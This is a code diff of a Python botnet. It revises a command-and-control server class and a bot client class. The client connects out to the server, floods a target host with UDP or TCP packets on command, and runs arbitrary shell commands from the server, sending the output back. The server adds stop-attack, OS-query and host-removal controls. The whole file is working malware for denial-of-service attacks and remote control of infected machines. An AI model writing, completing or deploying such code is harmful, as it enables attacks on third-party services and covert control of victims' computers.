@@ -1,12 +1,11 @@
 import socket
-import sys
 import threading
 import logging
 import os
-from concurrent.futures import ThreadPoolExecutor
 import threading
 from time import time as now
 import subprocess
+import platform
 
 
 class ServerBotnet:
@@ -15,36 +14,71 @@ class ServerBotnet:
         self.port = port
         self.exit = False
         self.conns = {}
+        self.socket = None
 
 
     def listen(self) -> None:
+        """ Listen for new connections """
+
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.bind((self.host, self.port))
+        self.socket = s
 
-        threading.Thread(target=self.acceptConnection, args=(s,)).start()
+        threading.Thread(target=self._acceptConnection).start()
 
     
-    def acceptConnection(self, s: socket.socket):
-        while self.exit == False:
-            s.listen()
-            conn, addr = s.accept()
-            self.conns.update({addr: conn})
+    def _acceptConnection(self):
+        """ Accept new connections """
 
+        while self.exit == False:
+            self.socket.listen()
+            conn, addr = self.socket.accept()
+            self.conns.update({addr[0]: conn})
+
+    
+    def stopServer(self):
+        """ Stop the server """
+
+        for host in self.conns:
+            self.conns[host].send(b"exit")
+            self.conns[host].close()
+
+        self.exit = True
+        self.socket.close()
+        pid = os.getpid()
+        os.kill(pid, 9)
 
 
     def attack(self, host: str, port: int, protocol: str, time: int) -> None:
-        attack_info = "attack" + "&" + host + "&" + str(port) + "&" + protocol + "&" + str(time)
-        
-        for conn in self.conns:
-            try:
-                self.conns[conn].settimeout(10)
-                self.conns[conn].send(attack_info.encode())
+        """ Start a new attack """
 
-            except Exception as e:
-                logging.error(e)
+        protocols = ['udp', 'tcp']
+        attack_info = "attack" + "§" + host + "§" + str(port) + "§" + protocol + "§" + str(time)
+        
+        
+        if protocol.lower() in protocols:
+            for conn in self.conns:
+                try:
+                    self.conns[conn].settimeout(10)
+                    self.conns[conn].send(attack_info.encode())
+
+                except Exception as e:
+                    logging.error(e)
+        
+        else:
+            logging.error("Invalid Protocoll: " + protocol)
     
 
+    def stopAttack(self):
+        """ Stop the attack """
+
+        for conn in self.conns:
+            self.conns[conn].send(b"stop")
+
+
     def ping(self, host: str) -> bool:
+        """ Ping a host """
+
         if host in self.conns:
             try:
                 self.conns[host].settimeout(10)
@@ -62,6 +96,8 @@ class ServerBotnet:
         
     
     def ping_all(self, autoremove: bool = False) -> dict:
+        """ Ping all the hosts """
+
         alives = {}
 
         for host in self.conns:
@@ -72,11 +108,16 @@ class ServerBotnet:
             
             else:
                 alives.update({host: False})
+
+                if autoremove:
+                    self.conns.pop(host)
             
         return alives
     
     
-    def shell(self, host: str, command: str) -> str:
+    def shell(self, host: str, command: str):
+        """ Execute a shell command """
+
         if host in self.conns:
             try:
                 self.conns[host].settimeout(10)
@@ -87,25 +128,47 @@ class ServerBotnet:
                     self.conns[host].settimeout(None)
                     self.conns[host].send(command.encode())
                     out = self.conns[host].recv(4096)
-                    
+
                     return out
             
             except Exception as e:
                 logging.error(e)
+        
+        else:
+            return False
     
 
     def remove(self, host: str) -> None:
+        """ Remove a host """
+
         if host in self.conns:
             self.conns[host].send(b"exit")
             self.conns.pop(host)
 
 
     def remove_all(self) -> None:
+        """ Remove all the hosts """
+        
         self.conns.clear()
 
 
     def connectedHosts(self):
+        """ Return all the connected hosts """
+
         return [host for host in self.conns]
+
+
+    def os(self, host: str):
+        """ Return the operative system of a host """
+
+        if host in self.conns:
+            self.conns[host].send(b"os")
+            osname = self.conns[host].recv(1024).decode()
+
+            return osname
+    
+        else:
+            return False
 
 
 
@@ -115,12 +178,14 @@ class ClinetBotnet():
         self.port = port
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connected = False
+        self.stopAttack = False
         self.time = 0
-        self.sent = 0
         self.lock = threading.Lock()
     
 
-    def connect(self):    
+    def connect(self):
+        """ Connect to the ServerBotnet """
+
         try:
             self.socket.connect((self.host, self.port))
             self.connected = True
@@ -129,18 +194,26 @@ class ClinetBotnet():
             logging.error(e)
 
 
-    def _listen(self):
+    def listen(self):
+        """ Listen for commands """
+
         command = b""
         s = self.socket
 
         while command != b"exit":
-            command = s.recv(1024).decode().split("&")
 
-            if "attack" in command:
+            command = s.recv(1024).decode()
+
+            if "§" in command:
+                command = command.split("§")
+
+            if command[0] == "attack":
                 host = command[1]
                 port = int(command[2])
                 protocol = command[3]
                 time = int(command[4])
+
+                self.stopAttack = False
 
                 if protocol.lower() == "udp":
                     self.udp(host, port, time)
@@ -148,14 +221,24 @@ class ClinetBotnet():
                 elif protocol.lower() == "tcp":
                     self.tcp(host, port, time)
 
-            if "ping" in command:
+            if command == "ping":
                 s.send(b"pong")
 
-            if "shell" in command:
+            if command == "shell":
                 s.send(b"OK")
                 command = s.recv(4096).decode()
                 output = self.shell(command)
                 s.send(output)
+            
+            if command == "os":
+                osname = self.os()
+                s.send(osname.encode())
+
+            if command == "stop":
+                self.stopAttack = True
+
+            if command == "exit":
+                s.close()
     
 
     def _sendUdp(self, host: str, port: int, Bytes: int):
@@ -165,19 +248,19 @@ class ClinetBotnet():
 
         while True:
             with self.lock:
-                if self.time - now() <= 0:
+                if self.time - now() <= 0 or self.stopAttack == True:
                     break
 
             s.sendto(os.urandom(Bytes), (host, port))
 
 
+
     def udp(self, host: str, port: str, time: int = 60, Bytes: int = 64):
         """ Start the UDP stress process """
 
-        with ThreadPoolExecutor(max_workers=16) as executor:
-            self.time = time + now()
-            for _ in range(16):
-                executor.submit(self._sendUdp, host, port, time, Bytes)
+        self.time = time + now()
+        for _ in range(16):
+            threading.Thread(target=self._sendUdp, args=(host, port, Bytes,)).start()
     
 
     def _sendTcp(self, host: str, port: int, Bytes: int):
@@ -191,7 +274,7 @@ class ClinetBotnet():
 
             while True:
                 with self.lock:
-                    if self.time - now() <= 0:
+                    if self.time - now() <= 0 or self.stopAttack == False:
                         break
 
                 s.send(os.urandom(Bytes), (host, port))
@@ -203,16 +286,22 @@ class ClinetBotnet():
     def tcp(self, host: str, port: str, time: int = 60, Bytes: int = 64):
         """ Start the UDP stress process """
 
-        with ThreadPoolExecutor(max_workers=16) as executor:
-            self.time = time + now()
-            for _ in range(16):
-                executor.submit(self._sendUdp, host, port, time, Bytes)
+        self.time = time + now()
+        for _ in range(16):
+            threading.Thread(target=self._sendUdp, args=(host, port, Bytes,))
     
 
     def shell(self, command: str):
+        """ Execute shell command """
+
         try:
             output = subprocess.check_output(command, shell=True)
-            self.socket.send(output)
+            return output
         
         except:
             self.socket.send("[Botnet] Shell Error")
+        
+    def os(self) -> str:
+        """ Return the os name """
+
+        return platform.platform()
